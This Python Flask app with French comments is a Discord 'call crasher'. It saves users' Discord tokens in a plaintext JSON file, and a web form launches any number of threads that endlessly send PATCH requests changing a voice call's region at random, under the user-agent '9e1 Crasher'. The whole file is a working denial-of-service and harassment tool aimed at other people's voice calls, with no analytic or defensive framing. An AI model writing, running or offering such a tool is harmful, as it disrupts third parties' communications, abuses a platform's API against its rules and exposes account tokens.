from flask import Flask, render_template, request, redirect, url_for
import threading, random, os, requests, json

app = Flask(__name__)

DATA_FILE = "users.json"
REGIONS = ['us-west', 'us-east', 'us-central', 'us-south', 'singapore', 'southafrica', 'sydney', 'rotterdam', 'brazil', 'hongkong', 'russia', 'japan', 'india', 'south-korea']

# Charger ou créer le fichier JSON pour les utilisateurs
def load_users():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump({}, f)
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(DATA_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Fonction pour changer de région
def hop_regions(token, channel_id):
    session = requests.Session()
    hopped = 0

    while True:
        response = session.patch(
            f"https://discord.com/api/v9/channels/{channel_id}/call",
            json={"region": random.choice(REGIONS)},
            headers={"authorization": token, "user-agent": "9e1 Crasher"}
        )
        if response.status_code == 204:
            hopped += 1
            print(f"Switched Region: {hopped}")

# Fonction pour démarrer le processus avec plusieurs threads
def start_hopping(token, channel_id, threads):
    for _ in range(threads):
        threading.Thread(target=hop_regions, args=(token, channel_id)).start()

# Route principale
@app.route('/', methods=['GET', 'POST'])
def home():
    users = load_users()
    if request.method == 'POST':
        action = request.form['action']

        if action == 'add_user':
            # Ajouter un utilisateur
            pseudo = request.form['pseudo']
            token = request.form['token']
            users[pseudo] = token
            save_users(users)
            return redirect(url_for('home'))

        elif action == 'start_process':
            # Démarrer le processus
            pseudo = request.form['selected_user']
            channel_id = request.form['channel_id']
            threads = int(request.form['threads'])
            token = users.get(pseudo)

            if token:
                threading.Thread(target=start_hopping, args=(token, channel_id, threads)).start()
            return redirect(url_for('home'))

    return render_template('index.html', users=users)

if __name__ == '__main__':
    app.run(debug=True)
